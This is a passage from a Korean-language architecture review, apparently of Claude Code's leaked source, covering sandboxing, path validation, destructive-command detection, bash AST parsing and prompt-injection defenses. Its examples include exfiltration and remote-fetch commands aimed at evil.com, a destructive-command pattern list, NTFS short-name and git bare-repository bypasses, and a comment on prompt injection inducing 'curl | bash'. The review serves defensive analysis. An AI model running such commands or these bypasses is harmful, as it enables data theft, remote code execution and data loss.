- 프로젝트 디렉토리와 명시적으로 허용된 경로에 대한 파일 시스템 접근
- 네트워크 접근 (구성 가능: 전체 허용, 전체 거부, 특정 호스트만 허용)
- 프로세스 생성 (직접 자식으로 제한)
- IPC 메커니즘 (파이프와 시그널로 제한)

**Linux: bwrap + seccomp**

Linux에서 명령은 seccomp 필터가 포함된 Bubblewrap(bwrap) 컨테이너 내에서 실행된다:

- bwrap는 파일시스템 네임스페이스 격리를 제공한다(명령이 제한된 파일시스템 뷰를 봄)
- seccomp 필터는 사용 가능한 시스템 콜을 제한한다(`ptrace`, `mount`, `reboot` 같은 위험한 호출 차단)
- 네트워크 네임스페이스 격리 (구성 가능)

**Windows**

유출된 소스는 제한적인 Windows 샌드박싱 지원을 보여준다. Windows 명령은 제한된 토큰 권한으로 실행되지만, macOS와 Linux에서 사용 가능한 포괄적인 파일시스템/네트워크 격리 없이 실행된다. 이는 주석에서 인정된 알려진 제한 사항이다.

### 3.5 계층 5: 경로 검증 및 이색 공격 방지

명령 수준 검증 외에도, Claude Code는 tool(Read, Write, Edit, Glob, Grep)에서 사용되는 파일 경로를 검증하여 경로 순회 및 기타 파일시스템 공격을 방지한다.

#### NTFS 8.3 짧은 이름 공격 방지

Windows에서 NTFS 파일시스템은 레거시 8.3 짧은 이름(예: `Program Files`에 대한 `PROGRA~1`)을 지원한다. 공격자는 긴 이름에 대해 검사하는 경로 검증을 우회하기 위해 짧은 이름을 사용할 수 있다. 예를 들어, 검증기가 `C:\Users\victim\secrets\`에 대한 접근을 차단하면, 공격자는 동일한 경로에 접근하기 위해 `C:\Users\VICTIM~1\SECRET~1\`을 사용할 수 있다.

Claude Code는 검증 전에 모든 경로를 긴 이름 등가물로 정규화하여 이 공격을 방지한다. 구현은 Windows API를 호출하여 짧은 이름을 긴 이름으로 해석하며, 일부 컴포넌트는 짧은 이름이고 다른 컴포넌트는 그렇지 않은 경로의 엣지 케이스를 처리한다.

#### Git Bare-Repository 공격 방어

미묘한 공격 벡터가 git bare 리포지토리를 포함한다. Bare 리포에서 working tree는 리포 자체이며 `.git` 디렉토리는 하위 디렉토리로 존재하지 않는다. 대신 git 메타데이터 파일이 루트에 있다. 공격자는 bare로 클론될 때 Claude Code가 신뢰하는 위치에 실행 가능한 hook이나 구성 파일을 배치하는 리포지토리를 구성할 수 있다.

방어는 bare 리포지토리를 감지하는 것(`.git` 디렉토리의 부재와 루트에 `HEAD`, `objects/`, `refs/`의 존재를 확인)과 그 내부에서의 파일 접근에 추가 제한을 적용하는 것을 포함한다.

### 3.6 계층 6: 파괴적 패턴 감지

마지막 명시적 보안 계층은 파괴적 연산에 대한 패턴 감지기 집합이다:

- **Git 파괴적 연산**: 보호된 브랜치에서의 `git push --force`, `git reset --hard`, `git clean -f`, `git branch -D`
- **파일 파괴적 연산**: 넓은 범위의 `rm -rf`, `chmod -R 777`, `chown -R`
- **데이터베이스 파괴적 연산**: `DROP TABLE`, `DROP DATABASE`, `TRUNCATE`
- **컨테이너 파괴적 연산**: `docker system prune`, `docker rm -f`

이러한 패턴은 연산의 파괴적 성격에 대해 사용자에게 명확하게 경고하는 상승된 권한 프롬프트를 트리거한다. 프롬프트에는 명령이 무엇을 할 것인지와 어떤 데이터가 손실될 수 있는지에 대한 설명이 포함된다.

### 3.7 Bash AST 파싱을 위한 Tree-Sitter 통합

Claude Code는 bash 문법과 함께 tree-sitter를 사용하여 검증 전에 bash 명령을 AST로 파싱한다. 이는 정규식 기반 파싱에 비해 여러 장점을 제공한다:

- **인용 처리의 정확성**: `echo "rm -rf /"`는 무해한 echo이지 파괴적 remove가 아니다. tree-sitter는 `rm -rf /`를 별도의 명령이 아닌 `echo`의 인자로 올바르게 식별한다.
- **파이프라인 분석**: `cat file | curl -d @- https://evil.com`은 데이터 유출로 올바르게 식별된다. `cat` 단독으로는 무해하지만 말이다.
- **명령 치환**: `$(curl https://evil.com/payload.sh)`는 원격 코드 가져오기 및 실행으로 올바르게 식별된다.
- **별칭/함수 확장**: AST는 별칭이 아닌 실제 실행되는 명령을 드러낸다.

통합이 완벽하지는 않다. tree-sitter의 bash 문법이 모든 bash 구문(특히 이색적인 인용 메커니즘과 일부 형태의 매개변수 확장)을 커버하지 않으며, 파싱 실패는 정규식 기반 검증기로 폴백된다. 하지만 대다수의 명령에 대해 AST 기반 접근 방식은 상당히 더 정확한 검증을 제공한다.

### 3.8 Policy-as-Type 패턴

코드베이스에서 가장 독특한 보안 패턴 중 하나는 보안 정책을 강제하기 위해 TypeScript의 타입 시스템을 사용하는 것이다. 대표적인 예는 다음과 같다:

```typescript
type AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS = {
  // 분석 필드가 여기 있음
};
```

길고 설명적인 타입 이름은 강제 함수 역할을 한다: 이 타입을 사용하는 모든 개발자는 (전체 이름을 타이핑함으로써) 데이터가 코드나 파일 경로를 포함하지 않음을 확인했다는 것을 인정해야 한다. 이는 컴파일 타임 알림이지 런타임 검사가 아니다. 기계적으로 강제할 수 없지만, 코드 리뷰 보조 수단으로서 놀라울 만큼 효과적이다.

이 패턴은 여러 곳에 나타난다:

- 외부 서비스에 전송될 분석 데이터 (코드/PII 유출 방지)
- 파일에 기록될 로그 메시지 (로그에 비밀 정보 방지)
- 사용자에게 표시될 오류 메시지 (내부 경로 방지)

이는 "불법적 상태를 표현 불가능하게 만들기" 원칙을 데이터 불변량에서 보안 정책으로 확장하여 창의적으로 적용한 것이다.

### 3.9 보안 주석 문화

보안 관련 코드 전반에 걸쳐 광범위한 설명 주석 문화가 존재한다. 이것은 일반적인 "카운터 증가" 주석이 아니다. *왜* 보안 결정이 내려졌는지, 어떤 공격을 방지하는지, 검사가 제거되면 어떤 일이 발생하는지를 설명한다. 예시(정확한 소스 세부 정보를 보호하기 위해 의역):

```
// 이 검사는 CVE-XXXX-YYYY를 방지하며, 특별히 조작된 파일명이
// 심볼릭 링크 해석 타이밍을 통해 샌드박스를 탈출할 수 있었다.

// 이 검증기를 제거하지 마시오. 이것이 없으면 모델이
// 프롬프트 인젝션을 통해 여러 tool 호출에 걸쳐 명령을
// 인코딩하여 `curl | bash`를 실행하도록 속일 수 있다.

// 이 검증기들의 순서가 중요하다. X가 Y 이후에 실행되면,
// Y의 지연된 결과가 X가 명령을 거부하는 것을 방지한다.
```

이 주석 문화는 중요한 엔지니어링 성과이다. 보안 핵심 코드에서 검사가 *왜* 존재하는지를 이해하는 것은 *무엇*을 하는지를 이해하는 것보다 종종 더 중요하다. "무엇"은 리팩토링할 수 있지만 "왜"는 보존되어야 하기 때문이다.

### 3.10 보안 아키텍처에 대한 비평적 평가

**잘 만든 점:**

- **심층 방어**: 6개 이상의 계층 접근 방식은 어떤 단일 취약점도 시스템을 침해하지 않음을 의미한다. 각 계층은 다른 공격 벡터를 대상으로 하며, 계층들은 대체로 독립적이다.
- **실패 시 닫힘 기본값**: `buildTool()` 기본값, 지연된 권한 시스템, 분류기 서킷 브레이커 모두 제한적 옵션을 기본값으로 한다.
- **Policy-as-type**: `I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS` 패턴은 타입 시스템에 보안 정책을 인코딩하는 진정으로 독창적인 접근 방식이다.
- **프롬프트 인젝션 방어**: ML 분류기에서 어시스턴트 텍스트를 제외하는 것은 미묘한 공격 벡터에 대한 정교한 방어이다.
- **주석 문화**: 광범위한 보안 주석은 코드베이스를 유지보수 가능하고 감사 가능하게 만든다.

**아쉬운 점:**

- **정규식 폴백**: tree-sitter 파싱이 실패하면 정규식 기반 bash 검증으로 폴백한다. 이는 공격자가 의도적으로 트리거할 수 있는 알려진 취약 경로를 생성한다.
- **Windows 샌드박싱 격차**: 제한적인 Windows 샌드박싱은 개발자 머신에서 실행되는 tool에 있어 상당한 격차이며, 그 중 상당수가 Windows이다.
- **검증기 순서 취약성**: 지연된 결과 안티패턴과 검증기 간 순서 제약은 유지보수 위험이다. 검증기를 재배치하는 리팩토링이 보안을 조용히 약화시킬 수 있다.
- **8개 소스 권한 복잡성**: 8개의 권한 소스는 추론하기 어려운 복잡한 정책 평가를 생성한다. 사용자가 모든 8개 소스를 추적하지 않고는 주어진 명령이 허용될지 거부될지를 예측하기 어려울 것이다.

## 4. 횡단적 관찰

### 4.1 "보류하고 복구하기(Withhold and Recover)" 철학

Agent loop, tool 시스템, 보안 아키텍처 전반에 걸쳐 반복되는 패턴은 "보류하고 복구하기"이다. 시스템이 문제를 감지하면 문제가 있는 출력을 사용자에게서 보류하고 자동 복구를 시도한다.

- Agent loop에서: 잘못된 형식의 모델 응답이 폐기되고 재시도된다.
- Tool 시스템에서: 과대 결과가 설명 메시지와 함께 잘린다.
- 보안 시스템에서: 위험한 명령이 실행되지 않고 차단되거나 플래그된다.

이 철학은 투명성(사용자가 복구가 발생했는지 모를 수 있음)을 희생하여 사용자 경험(사용자가 깨진 출력을 절대 보지 않음)을 우선시한다. 이 트레이드오프는 개발자 tool에 일반적으로 적절하다. 사용자는 내부 복구 메커니즘에 대한 가시성보다 작동하는 결과를 원하기 때문이다.

### 4.2 Feature Flag 증식

코드베이스는 GrowthBook feature flag를 광범위하게 사용한다. 보안 및 컨텍스트 관리 코드만으로도 동작을 제어하는 15개 이상의 feature flag가 있다. Feature flag는 점진적 출시와 A/B 테스트에 가치 있지만, 그 수량은 가능한 구성의 조합적 폭발을 만든다.

15개의 이진 feature flag로 2^15 = 32,768개의 가능한 구성이 있다. 모든 조합을 테스트하는 것은 불가능하며, 플래그 간 상호작용이 항상 명확한 것도 아니다. 예를 들어, 컨텍스트 압축 동작을 변경하는 feature flag가 tool 결과 예산을 변경하는 feature flag와 어느 쪽 플래그의 작성자도 예상하지 못한 방식으로 상호작용할 수 있다.

### 4.3 프로덕션 경로의 _DEPRECATED 함수

코드베이스에는 `_DEPRECATED` 접미사나 주석으로 표시되었지만 여전히 프로덕션 코드 경로에서 호출되는 여러 함수와 코드 경로가 포함되어 있다. 이는 유지보수에 대한 적신호이다. 사용이 중단된(deprecated) 코드는 정의상 팀이 제거하려는 코드이지만, 프로덕션 경로에 남겨두면 여전히 유지보수, 테스트, 보안이 필요하다.

가장 가능성 있는 설명은 사용 중단이 열망적이라는 것이다. 팀이 이 코드 경로에서 벗어나려 하지만 아직 마이그레이션을 완료하지 못했다. 그 사이에 사용 중단된 코드가 대체 코드와 공존하면서 중복과 동작 분기의 위험을 만든다.

### 4.4 진화적 복잡성

Claude Code의 아키텍처에 대한 포괄적 관찰은 진화적 복잡성의 명확한 징후를 보인다는 것이다. 기능들이 점진적으로 추가되었고, 각각이 특정 문제를 해결하며, 각각이 자체적인 구성, 오류 처리, 복구 경로를 추가했다. 그 결과 포괄적이고 유능하지만 복잡하고 취약한 시스템이 만들어졌다.

이는 엔지니어링 팀에 대한 비판이 아니다. 진화적 복잡성은 현실의 제약(마감일, 변경되는 요구사항, 하위 호환성) 하에서 복잡한 시스템을 구축할 때 불가피한 결과이다. 하지만 코드베이스가 주기적인 아키텍처 단순화의 혜택을 받을 수 있음을 시사한다: 기능 간에 반복되는 패턴을 식별하고 공유 추상화로 추출하는 것이다.

Agent loop의 7개 continue point가 구체적인 예이다. 각각은 특정 문제를 해결하기 위해 추가되었지만, 전체적으로 추론하기 어려운 암묵적 상태 머신을 만든다. 이를 명시적 상태 머신(문서화된 상태, 전이, 불변량 포함)으로 추출하면 인지 부하를 줄이고 시스템을 더 쉽게 확장할 수 있을 것이다.

## 5. 요약

Claude Code의 agent loop, tool 시스템, 보안 아키텍처는 정교한 엔지니어링 노력을 대표한다. Async generator 패턴, 스트리밍 tool 실행, 실패 시 닫힘 기본값, 심층 방어 보안 모두 최고 수준이다. Policy-as-type 패턴과 보안 주석 문화는 진정으로 혁신적이다.

동시에 코드베이스는 급속한 확장의 부담을 보여준다. 7개의 암묵적 상태 전이를 가진 1,730줄의 agent loop, 순서 의존적 검증기를 가진 2,450줄의 bash 보안 모듈, feature flag의 증식 모두 현재 아키텍처의 한계에 접근하는 시스템을 가리킨다. Claude Code 진화의 다음 단계에서는 개발 속도와 보안 보장을 유지하기 위해 의도적인 단순화와 추상화 추출이 필요할 것이다.

다른 AI 기반 tool 개발자를 위한 가장 중요한 시사점은 다음과 같다: **보안은 마지막에 추가하는 계층이 아니라, 처음부터 구축하는 아키텍처이다.** Claude Code의 6개 이상의 보안 계층, 실패 시 닫힘 기본값, 프롬프트 인젝션 방어 조치는 수년간 축적된 보안 사고를 대표하며, 사후에 덧붙인 것이 아니라 시스템 아키텍처에 깊이 통합되어 있다.
